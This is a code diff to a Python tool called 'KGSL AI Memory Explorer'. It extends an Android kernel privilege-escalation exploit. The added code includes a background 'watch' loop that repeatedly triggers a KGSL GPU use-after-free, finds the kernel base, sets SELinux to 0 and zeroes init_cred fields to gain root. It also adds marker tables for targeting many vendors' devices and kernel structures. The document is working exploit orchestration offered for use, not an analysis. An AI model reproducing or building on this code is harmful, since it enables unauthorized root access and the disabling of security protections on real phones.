@@ -134,30 +134,83 @@ class MemoryExplorerAI:
         self.selinux_va  = None
         self.cred_va     = None
         self.auto_mode   = True    # pressing E auto-runs full pipeline
+        self.watch_mode  = False   # auto-re-run exploit pipeline in background
+        self.watch_thread = None
 
         # Cancel flag for background operations
         self.cancel_flag = threading.Event()
         self.bg_thread = None
         self.bg_lock = threading.Lock()
 
-        # Heuristics
+        # Heuristics — device-agnostic: covers Android, AOSP, Google, Samsung,
+        # Huawei, Sony, Xiaomi, OnePlus, Asus and other common packages.
         self.system_apps = {
-            "com.android.settings": "System Settings (Developer Mode)",
-            "com.android.systemui": "System UI (Status Bar/Home)",
-            "com.android.camera": "Camera Driver Context",
-            "com.android.gallery3d": "Gallery/Media Provider",
-            "com.android.deskclock": "System Clock/Alarms",
-            "com.android.contacts": "Contacts/Phonebook",
-            "com.google.android.gms": "Google Play Services",
-            "com.asus.launcher": "ASUS Launcher",
-            "android.uid.system": "System UID Context (UID 1000)",
+            # AOSP / Google
+            "com.android.settings":     "System Settings (Developer Mode)",
+            "com.android.systemui":     "System UI (Status Bar/Home)",
+            "com.android.camera":       "Camera Driver Context",
+            "com.android.gallery3d":    "Gallery/Media Provider",
+            "com.android.deskclock":    "System Clock/Alarms",
+            "com.android.contacts":     "Contacts/Phonebook",
+            "com.android.phone":        "Phone/Telephony Service",
+            "com.android.inputmethod":  "IME / Keyboard Service",
+            "com.android.launcher":     "AOSP Launcher (Home Screen)",
+            "com.android.shell":        "ADB Shell / Root Helper",
+            "com.android.keyguard":     "Lock Screen Service",
+            "com.android.providers.media": "Media Provider (DCIM)",
+            "com.android.webview":      "System WebView (Chromium)",
+            "com.google.android.gms":   "Google Play Services",
+            "com.google.android.gsf":   "Google Services Framework",
+            # Samsung
+            "com.samsung.android.launcher":  "Samsung OneUI Launcher",
+            "com.samsung.android.app.spage": "Samsung Daily Briefing",
+            "com.samsung.android.sm_cn":     "Samsung SmartThings",
+            "com.sec.android.app.launcher":  "Samsung Legacy Launcher",
+            # Huawei / Honor
+            "com.huawei.android.launcher":    "Huawei EMUI Launcher",
+            "com.hihonor.android.launcher":   "Honor MagicUI Launcher",
+            "com.huawei.systemui":            "Huawei SystemUI",
+            # Sony
+            "com.sonyericsson.home":          "Sony Xperia Home",
+            "com.sonymobile.home":            "Sony Xperia Home (new)",
+            # Xiaomi / Redmi / POCO
+            "com.miui.home":                  "Xiaomi MIUI Launcher",
+            "com.miui.systemui":              "Xiaomi SystemUI",
+            # OnePlus / OPPO / Realme (ColorOS / OxygenOS)
+            "com.oneplus.launcher":           "OnePlus Launcher",
+            "com.oppo.launcher":              "OPPO ColorOS Launcher",
+            # Asus (ROG / Zenfone)
+            "com.asus.launcher":              "ASUS Launcher (ROG/Zenfone)",
+            "com.asus.weathertime":           "ASUS Weather Widget",
+            # Other common
+            "android.uid.system":             "System UID Context (UID 1000)",
+            "android.uid.phone":              "Phone UID Context",
+            "u:object_r:system_app:s0":       "SELinux System App Label",
+            "u:object_r:priv_app:s0":         "SELinux Privileged App Label",
         }
+        # Kernel structure markers (device-agnostic — AArch64 ELF magic,
+        # ARM64 prologue, common kernel strings, KGSL driver markers).
         self.kernel_structures = {
-            b"KETO0422": "task_struct (Active Process Marker)",
-            b"init_cred": "Kernel Root Credentials (Global)",
-            b"selinux_enforcing": "SELinux Status Bit",
-            b"\x7f" + b"ELF": "Kernel Executable Header (Base)",
-            b"\xFD\x7B\xBF\xA9": "AArch64 Function Prologue (Code)",
+            b"KETO0422":                  "task_struct (Active Process Marker)",
+            b"init_cred":                 "Kernel Root Credentials (Global)",
+            b"selinux_enforcing":         "SELinux Status Bit",
+            b"selinux_enabled":           "SELinux Enable Switch",
+            b"kptr_restrict":             "Kernel Pointer Restriction",
+            b"\x7f" + b"ELF":             "Kernel Executable Header (Base)",
+            b"\xFD\x7B\xBF\xA9":          "AArch64 Function Prologue (Code)",
+            b"\x00\x00\x00\x94":          "AArch64 BL/BLR Instruction",
+            b"Linux version":             "Kernel Banner String",
+            b"kgsl-3d0":                  "KGSL GPU Driver (target device)",
+            b"mdss_fb":                   "Display Framebuffer Driver",
+            b"abov_sar":                  "SAR Sensor (vendor-specific)",
+            b"scsi":                      "SCSI Storage Subsystem",
+            b"slub":                      "SLUB Allocator Marker",
+            b"cred_jar":                  "Cred Cache (SLUB)",
+            b"task_struct":               "Task Struct Type Name",
+            b"kmem_cache":                "Kernel Memory Cache",
+            b"modprobe_path":             "Modprobe Helper Path",
+            b"core_pattern":              "Core Dump Pattern",
+            b"poweroff_cmd":              "Poweroff Command Path",
         }
         self.offsets = {"pid": 0x548, "comm": 0x718, "cred": 0x770, "real_cred": 0x768, "tasks": 0x3f0}
 
@@ -268,6 +321,13 @@ class MemoryExplorerAI:
         if b"\x00\x00\x00\x94" in page_data:
             return {"type": "Kernel Code", "description": "Executable AArch64 Segment",
                     "va": hex(va), "confidence": 60, "data": page_data}
+        # Permissive fallback: use _is_page_interesting so we get a useful
+        # description/confidence instead of a generic "Unclassified Data Fragment"
+        interesting, reason, conf = self._is_page_interesting(page_data)
+        if interesting:
+            return {"type": "Unknown Object",
+                    "description": f"Auto-classified ({reason})",
+                    "va": hex(va), "confidence": conf, "data": page_data}
         return {"type": "Unknown Object", "description": "Unclassified Data Fragment",
                 "va": hex(va), "confidence": 10, "data": page_data}
 
@@ -416,12 +476,12 @@ class MemoryExplorerAI:
 
             out.append(f"{C.GRY}{'─'*92}{C.RST}")
 
-            # Color-coded menu (E, L, S = GREEN 1st/2nd/3rd; C, R, B, Q, ID = BLUE neutral)
+            # Color-coded menu (E, L, S, W = GREEN 1st/2nd/3rd/4th; C, R, B, Q, ID = BLUE neutral)
             out.append(
                 f" {C.GRN}[E]{C.RST} Exploit Trigger   "
                 f"{C.GRN}[L]{C.RST} AI Learning Loop  "
                 f"{C.GRN}[S]{C.RST} Start AI Scan     "
-                f"{C.BLU}[C]{C.RST} Clear Memory"
+                f"{C.GRN}[W]{C.RST} Watch (auto-retry)"
             )
             out.append(
                 f" {C.BLU}[R]{C.RST} Verify Root       "
@@ -433,6 +493,16 @@ class MemoryExplorerAI:
                 f" {C.BLU}[list]{C.RST} Show All Items "
                 f" {C.BLU}[kb]{C.RST} Kernel Intel   "
                 f" {C.BLU}[log]{C.RST} Spray Log"
+            )
+            out.append(
+                f" {C.BLU}[stats]{C.RST} AI Stats    "
+                f" {C.BLU}[save]{C.RST} Export JSON  "
+                f" {C.BLU}[dev]{C.RST} Device Info"
+            )
+            out.append(
+                f" {C.BLU}[v<N>]{C.RST} Re-verify    "
+                f" {C.BLU}[reset_kb]{C.RST} Clear KB   "
+                f" {C.BLU}[help]{C.RST} Help"
             )
             out.append(f"{C.GRY}{'─'*92}{C.RST}")
 
@@ -783,6 +853,104 @@ class MemoryExplorerAI:
             return line.decode(errors="ignore").strip()
         except Exception:
             return None
+
+    # ============== WATCH MODE (continuous auto-exploit) ==============
+    def cmd_watch_start(self):
+        """Auto-re-run the exploit pipeline continuously in a background thread.
+        Each cycle: UAF → kbase → selinux → cred → patch. Stops when watch_mode
+        is cleared or Ctrl+P is pressed."""
+        self.live["last_command"] = "WATCH"
+        if self.watch_mode and self.watch_thread and self.watch_thread.is_alive():
+            self.live["last_msg"] = "Watch mode already running — Ctrl+P to stop."
+            return
+        self.cancel_flag.clear()
+        self.watch_mode = True
+        self.watch_thread = threading.Thread(target=self._watch_worker, daemon=True)
+        self.watch_thread.start()
+        self.live["last_msg"] = "Watch mode started. Pipeline will auto-repeat."
+        self.log_event("watch_start", {})
+
+    def cmd_watch_stop(self):
+        self.watch_mode = False
+        self.cancel_flag.set()
+        self.live["last_msg"] = "Watch mode stopped."
+
+    def _watch_worker(self):
+        """Continuous exploit pipeline. Re-runs every 30s, or sooner if
+        previous run failed. Updates TUI live status so user sees progress
+        without pressing keys."""
+        cycle = 0
+        while self.watch_mode and not self.cancel_flag.is_set():
+            cycle += 1
+            self.live["last_msg"] = f"WATCH cycle {cycle}: UAF + chain…"
+            try:
+                # 1. Ensure engine is up
+                if not self.ensure_engine():
+                    self.live["last_msg"] = "WATCH: engine not available, retrying in 10s…"
+                    time.sleep(10)
+                    continue
+                # 2. Run the exploit (will chain to kbase/selinux/cred/patch)
+                self._run_exploit_pipeline()
+            except Exception as e:
+                self.live["last_msg"] = f"WATCH error: {e}"
+                self.log_event("watch_error", {"err": str(e)})
+            # 3. Sleep between cycles
+            for _ in range(30):
+                if not self.watch_mode or self.cancel_flag.is_set():
+                    break
+                time.sleep(1)
+        self.live["last_msg"] = f"Watch mode stopped after {cycle} cycles."
+        self.log_event("watch_stop", {"cycles": cycle})
+
+    def _run_exploit_pipeline(self):
+        """Replicate the auto-pipeline from trigger_exploit but as a callable."""
+        # This is a synchronous pipeline (called by watch worker or
+        # trigger_exploit's worker). It does NOT spawn a new thread.
+        self.op_busy["exploit"] = True
+        try:
+            if not self._engine_write(b"exploit\n"):
+                self.live["last_msg"] = "Engine write failed"
+                return
+            # Wait for UAF_READY / UAF_FAILED
+            deadline = time.time() + 30
+            while time.time() < deadline:
+                line = self._readline_timeout(timeout=0.5)
+                if line is None:
+                    break
+                if "UAF_READY" in line or "UAF_FAILED" in line:
+                    if "UAF_FAILED" in line:
+                        self.live["last_msg"] = f"WATCH: {line}"
+                    break
+            else:
+                self.live["last_msg"] = "WATCH: UAF timeout"
+                return
+            if "UAF_READY" not in (line or ""):
+                return
+            # Find kbase
+            self.live["last_msg"] = "WATCH: finding kernel base…"
+            kbase = self._find_kernel_base()
+            if not kbase:
+                self.live["last_msg"] = "WATCH: no kbase"
+                return
+            self.kernel_base = kbase
+            # Probe SELinux
+            self.live["last_msg"] = "WATCH: probing SELinux…"
+            sel = self._probe_selinux(kbase)
+            if sel:
+                self.selinux_va, val = sel
+                self.patch_mem(self.selinux_va, 0)
+            # Find init_cred
+            self.live["last_msg"] = "WATCH: finding init_cred…"
+            ic = self._find_init_cred(kbase)
+            if ic:
+                self.cred_va = ic
+                for off in (4, 8, 12, 16, 20, 24):
+                    self.patch_mem(self.cred_va + off, 0)
+            self.live["last_msg"] = (f"WATCH: kbase=0x{kbase:x} "
+                                    f"selinux={'0x%x'%self.selinux_va if self.selinux_va else 'N/A'} "
+                                    f"cred={'0x%x'%self.cred_va if self.cred_va else 'N/A'}")
+        finally:
+            self.op_busy["exploit"] = False
 
     # ============== ACTIONS ==============
     def trigger_exploit(self):
@@ -1191,6 +1359,30 @@ class MemoryExplorerAI:
                                 possible_kbase = va & ~0xFFFFFF
                                 self.knowledge_base.setdefault(
                                     "candidate_kbases", []).append(hex(possible_kbase))
+                                # If we found a task_struct with KETO0422 at a known
+                                # offset, the kernel base is likely nearby. Try to
+                                # lock it in by reading ELF magic at the candidate.
+                                if not self.kernel_base:
+                                    self.live["last_msg"] = (
+                                        f"LEARN: found task_struct @ 0x{va:x}, "
+                                        f"probing kbase…")
+                                    kbase = self._find_kernel_base()
+                                    if kbase:
+                                        self.kernel_base = kbase
+                                        self.live["last_msg"] = (
+                                            f"LEARN: kbase locked to 0x{kbase:x}, "
+                                            f"probing SELinux…")
+                                        sel = self._probe_selinux(kbase)
+                                        if sel:
+                                            self.selinux_va, _ = sel
+                                            self.live["last_msg"] = (
+                                                f"LEARN: selinux @ 0x{self.selinux_va:x}")
+                                        # Try init_cred via alternate offsets
+                                        ic = self._find_init_cred(kbase)
+                                        if ic:
+                                            self.cred_va = ic
+                                            self.live["last_msg"] = (
+                                                f"LEARN: init_cred @ 0x{ic:x}")
                         else:
                             # Keep weaker matches as "Unknown Object" so user
                             # can inspect them manually
@@ -1419,16 +1611,28 @@ class MemoryExplorerAI:
             st = L["status"]
             st_c = C.GRN if "ACTIVE" in st or "SCAN" in st or "EXPLOIT" in st else C.GRY
             spray_pct = min(99, 100 * L["spray_count"] // max(1, L["spray_target"])) if L["spray_target"] else 0
+            n_found = len(self.found_items)
+            n_spray = len(self.spray_procs)
+            # Compact kbase (last 8 hex digits)
+            if self.kernel_base:
+                kbase_str = f"{C.GRN}0x{self.kernel_base & 0xffffffffffffffff:016x}{C.RST}"
+            else:
+                kbase_str = f"{C.RED}none{C.RST}"
+            # None = not yet found/disabled = SELinux still ON = red (bad for us)
+            # Set  = found (and likely patched)       = SELinux OFF       = green (good for us)
+            selinux_str = (C.RED + "ON " + C.RST) if self.selinux_va is None else (C.GRN + "OFF" + C.RST)
             # Use ANSI save/restore cursor so we don't disturb prompt position
             sys.stdout.write(
                 f"\0337"  # save cursor
                 f"\033[1A\r\033[2K"  # up one line, clear
-                f" {C.DIM}live:{C.RST} "
-                f"{st_c}{st:<14}{C.RST} {C.GRY}│{C.RST} "
-                f"RAM {ram_c}{ram:5.1f}%{C.RST} {C.GRY}│{C.RST} "
-                f"AI {C.MAG}{L['ai_patterns']:>4}{C.RST} {C.GRY}│{C.RST} "
-                f"spray {C.CYN}{spray_pct:>3}%{C.RST} {C.GRY}│{C.RST} "
-                f"last: {C.YEL}{L['last_msg'][:60]}{C.RST}\n"
+                f" {C.DIM}▸{C.RST} "
+                f"{st_c}{st:<10}{C.RST}·"
+                f"RAM{ram_c}{ram:4.0f}%{C.RST}·"
+                f"AI{C.MAG}{L['ai_patterns']:>3}{C.RST}·"
+                f"sp{C.CYN}{spray_pct:>3}%{C.RST}·"
+                f"#found{C.YEL}{n_found:>3}{C.RST}·"
+                f"kbase{kbase_str}·"
+                f"selinux{selinux_str}\n"
                 f"\0338"  # restore cursor
             )
             sys.stdout.flush()
@@ -1436,6 +1640,37 @@ class MemoryExplorerAI:
             pass
         finally:
             self.render_lock.release()
+
+    # ============== ITEM VERIFICATION ==============
+    def verify_item(self, item_idx):
+        """Re-read the VA of a found item and re-classify the page.
+        Useful when the user wants to confirm a found offset is still valid."""
+        if item_idx < 0 or item_idx >= len(self.found_items):
+            self.live["last_msg"] = f"Invalid index: {item_idx}"
+            return
+        item = self.found_items[item_idx]
+        try:
+            va = int(item["va"], 16)
+        except Exception:
+            self.live["last_msg"] = f"Invalid VA: {item['va']}"
+            return
+        self.live["last_msg"] = f"Verifying {item['va']}…"
+        data = self.read_page(va)
+        if not data:
+            self.live["last_msg"] = f"Read failed: {item['va']} (UAF dead?)"
+            return
+        item["data"] = data
+        # Re-classify using permissive filter so even weak pages get a
+        # meaningful description
+        interesting, reason, conf = self._is_page_interesting(data)
+        if interesting:
+            item["description"] = f"Re-verified: {reason}"
+            item["confidence"] = conf
+            self.live["last_msg"] = (f"[{item_idx:02d}] {item['va']} re-verified: "
+                                     f"{reason} (conf={conf}%)")
+        else:
+            self.live["last_msg"] = (f"[{item_idx:02d}] {item['va']} re-verified: "
+                                     f"EMPTY/ZERO ({sum(1 for b in data if b != 0)} non-zero bytes)")
 
     # ============== DETAIL VIEW ==============
     def show_detail(self, item_idx):
@@ -1545,6 +1780,11 @@ class MemoryExplorerAI:
                 self.cmd_learning_start()
             elif cmd in ("s", "scan"):
                 self.cmd_scan()
+            elif cmd in ("w", "watch"):
+                if self.watch_mode:
+                    self.cmd_watch_stop()
+                else:
+                    self.cmd_watch_start()
             elif cmd in ("c", "clear"):
                 self.cmd_clear()
             elif cmd in ("r", "root"):
@@ -1636,6 +1876,153 @@ class MemoryExplorerAI:
                     self.input_cmd()
                 except Exception:
                     pass
+            elif cmd in ("stats", "stat"):
+                # Detailed learning statistics
+                sys.stdout.write(C.CLR)
+                sys.stdout.write(f"{C.BOLD}{C.CYN}=== AI LEARNING STATS ==={C.RST}\n")
+                sys.stdout.write(f"{C.GRY}{'─'*60}{C.RST}\n")
+                s = getattr(self, "learn_stats", {}) or {}
+                sys.stdout.write(f" {C.BOLD}Batches run{C.RST}      : {C.MAG}{s.get('batches', 0)}{C.RST}\n")
+                sys.stdout.write(f" {C.BOLD}Sprays total{C.RST}     : {C.MAG}{s.get('sprayed_total', 0)}{C.RST}\n")
+                sys.stdout.write(f" {C.BOLD}Matches{C.RST}          : {C.YEL}{s.get('matches', 0)}{C.RST}\n")
+                sys.stdout.write(f" {C.BOLD}Verified{C.RST}         : {C.GRN}{s.get('verified', 0)}{C.RST}\n")
+                sys.stdout.write(f" {C.BOLD}Auto-kept{C.RST}        : {C.CYN}{s.get('auto_kept', 0)}{C.RST} (weak-but-interesting)\n")
+                sys.stdout.write(f" {C.BOLD}False positives{C.RST}  : {C.RED}{s.get('false_positives', 0)}{C.RST}\n")
+                if s.get("matches", 0) > 0:
+                    rate = 100.0 * s.get("verified", 0) / s["matches"]
+                    sys.stdout.write(f" {C.BOLD}Verify rate{C.RST}      : {C.MAG}{rate:.1f}%{C.RST}\n")
+                sys.stdout.write(f"\n {C.DIM}Found items in list{C.RST}: {C.MAG}{len(self.found_items)}{C.RST}\n")
+                sys.stdout.write(f" {C.DIM}Spray procs alive{C.RST}  : {C.MAG}{len(self.spray_procs)}{C.RST}\n")
+                sys.stdout.write(f" {C.DIM}Engine PID{C.RST}        : {C.MAG}{self.live.get('engine_pid', 0)}{C.RST}\n")
+                sys.stdout.write(f"{C.GRY}{'─'*60}{C.RST}\n")
+                sys.stdout.write("Press Enter to return...")
+                sys.stdout.flush()
+                try:
+                    self.input_cmd()
+                except Exception:
+                    pass
+            elif cmd in ("save", "dump", "export"):
+                # Save found items to JSON file
+                out_path = os.path.join(os.path.dirname(os.path.abspath(__file__)),
+                                        "found_items.json")
+                try:
+                    export = []
+                    for it in self.found_items:
+                        # Don't dump raw page data to JSON (too large)
+                        e = {k: v for k, v in it.items() if k != "data"}
+                        export.append(e)
+                    with open(out_path, "w") as f:
+                        json.dump({"ts": datetime.datetime.now().isoformat(),
+                                   "kernel_base": hex(self.kernel_base) if self.kernel_base else None,
+                                   "selinux_va":  hex(self.selinux_va)  if self.selinux_va  else None,
+                                   "cred_va":     hex(self.cred_va)     if self.cred_va     else None,
+                                   "items": export}, f, indent=2)
+                    self.live["last_msg"] = f"Saved {len(export)} items → {out_path}"
+                except Exception as e:
+                    self.live["last_msg"] = f"Save failed: {e}"
+            elif cmd in ("device", "dev", "info"):
+                # Show device / runtime info
+                sys.stdout.write(C.CLR)
+                sys.stdout.write(f"{C.BOLD}{C.CYN}=== DEVICE / RUNTIME INFO ==={C.RST}\n")
+                sys.stdout.write(f"{C.GRY}{'─'*60}{C.RST}\n")
+                # Try getprop
+                for prop, label in [
+                    ("ro.product.manufacturer", "Manufacturer"),
+                    ("ro.product.model",        "Model"),
+                    ("ro.product.brand",        "Brand"),
+                    ("ro.product.device",       "Device"),
+                    ("ro.build.version.release", "Android ver"),
+                    ("ro.build.version.sdk",    "SDK"),
+                    ("ro.product.cpu.abi",      "ABI"),
+                    ("ro.boot.hardware",        "Hardware"),
+                    ("ro.kernel.qemu",          "QEMU"),
+                ]:
+                    try:
+                        val = subprocess.check_output(["getprop", prop], text=True, timeout=1).strip()
+                    except Exception:
+                        val = "—"
+                    sys.stdout.write(f" {C.BOLD}{label:<14}{C.RST}: {C.WHT}{val}{C.RST}\n")
+                # Engine path + size
+                try:
+                    sz = os.path.getsize(self.engine_path)
+                except Exception:
+                    sz = 0
+                sys.stdout.write(f"\n {C.BOLD}Engine{C.RST}     : {C.CYN}{self.engine_path}{C.RST} ({sz} bytes)\n")
+                sys.stdout.write(f" {C.BOLD}PID{C.RST}        : {C.CYN}{self.live.get('engine_pid', 0)}{C.RST}\n")
+                sys.stdout.write(f" {C.BOLD}Uptime{C.RST}     : {C.CYN}{int(time.time() - self.live['uptime_start'])}s{C.RST}\n")
+                sys.stdout.write(f" {C.BOLD}RAM{C.RST}        : {C.CYN}{self.live.get('ram', 0):.1f}%{C.RST}\n")
+                sys.stdout.write(f"{C.GRY}{'─'*60}{C.RST}\n")
+                sys.stdout.write("Press Enter to return...")
+                sys.stdout.flush()
+                try:
+                    self.input_cmd()
+                except Exception:
+                    pass
+            elif cmd in ("clear_kb", "reset_kb"):
+                # Reset knowledge base
+                self.knowledge_base = {
+                    "successful_vas": [],
+                    "selinux_candidates": [],
+                    "cred_candidates": [],
+                    "candidate_kbases": [],
+                    "system_app_vas": [],
+                    "kernel_markers": [],
+                    "hit_count": 0,
+                }
+                self.save_kb()
+                self.live["last_msg"] = "Knowledge base reset."
+            elif cmd in ("help", "?", "h"):
+                # Show full help
+                sys.stdout.write(C.CLR)
+                sys.stdout.write(f"{C.BOLD}{C.CYN}=== KGSL AI MEMORY EXPLORER — HELP ==={C.RST}\n")
+                sys.stdout.write(f"{C.GRY}{'─'*75}{C.RST}\n")
+                lines = [
+                    ("E / exploit",       "Run KGSL UAF → auto chain (kbase→selinux→cred→patch)"),
+                    ("L / learn",          "Start AI learning in background (Ctrl+P to cancel)"),
+                    ("S / scan",           "One-shot scan of UAF range"),
+                    ("W / watch",          "Auto-retry exploit pipeline in background (toggle)"),
+                    ("C / clear",          "Kill all spray processes, free RAM"),
+                    ("R / root",           "Verify current uid (id command)"),
+                    ("B / build",          "Recompile C engine (gcc/clang)"),
+                    ("Q / quit",           "Exit explorer"),
+                    ("<id>",               "Open detail view of found item #id"),
+                    ("v<id>",              "Re-verify found item #id (re-read VA)"),
+                    ("list / ls / items",  "Paginated dump of ALL found items"),
+                    ("kb / kbase",         "Show kernel base / SELinux / init_cred status"),
+                    ("log / logs",         "Show recent spray log (JSONL)"),
+                    ("stats / stat",       "Show AI learning statistics"),
+                    ("save / export",      "Save found items → found_items.json"),
+                    ("dev / device",       "Show device info (getprop)"),
+                    ("reset_kb",           "Reset knowledge base"),
+                    ("help / ? / h",       "Show this help"),
+                ]
+                for k, v in lines:
+                    sys.stdout.write(f"  {C.GRN}{k:<18}{C.RST} {C.WHT}{v}{C.RST}\n")
+                sys.stdout.write(f"\n{C.MAG}── KEYBOARD SHORTCUTS ──{C.RST}\n")
+                kbd = [
+                    ("Enter",       "Submit command / go back from detail view"),
+                    ("Backspace",   "Erase one char in command line"),
+                    ("Up / Down",   "Browse command history"),
+                    ("Ctrl+C",      "Quit explorer"),
+                    ("Ctrl+P",      "Cancel running AI learning"),
+                    ("Ctrl+E",      "Rewind to last submitted command"),
+                ]
+                for k, v in kbd:
+                    sys.stdout.write(f"  {C.YEL}{k:<14}{C.RST} {C.WHT}{v}{C.RST}\n")
+                sys.stdout.write(f"{C.GRY}{'─'*75}{C.RST}\n")
+                sys.stdout.write("Press Enter to return...")
+                sys.stdout.flush()
+                try:
+                    self.input_cmd()
+                except Exception:
+                    pass
+            elif cmd.startswith("v") and cmd[1:].isdigit():
+                # Re-verify a found item by re-reading its VA
+                idx = int(cmd[1:])
+                if 0 <= idx < len(self.found_items):
+                    self.verify_item(idx)
+                else:
+                    self.live["last_msg"] = f"Invalid idx: {idx}"
             elif cmd.isdigit():
                 self.show_detail(int(cmd))
             elif cmd:
